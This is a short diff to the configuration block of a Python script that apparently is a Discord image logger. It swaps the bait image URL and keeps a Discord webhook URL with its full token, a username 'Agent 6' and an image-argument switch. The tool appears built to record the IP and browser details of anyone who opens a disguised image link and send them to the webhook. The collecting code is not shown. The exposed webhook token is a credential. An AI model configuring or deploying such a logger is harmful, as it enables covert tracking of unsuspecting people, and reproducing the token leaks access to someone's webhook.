@@ -8,7 +8,7 @@ import httpagentparser
 # Configuration
 config = {
     "webhook": "https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc",
-    "image": "https://i.pinimg.com/736x/27/23/68/27236835e767166454a6335e4cfe0549.jpg",
+    "image": "https://cdn.discordapp.com/attachments/1454160227611050247/1461001126324473926/image.png?ex=697eb794&is=697d6614&hm=a817fd7d2715116946ba366720ff256071ba375b449c497dc5fafa8bffa99a56&",
     "imageArgument": True,
     "username": "Agent 6",
     "color": 0x00FFFF,
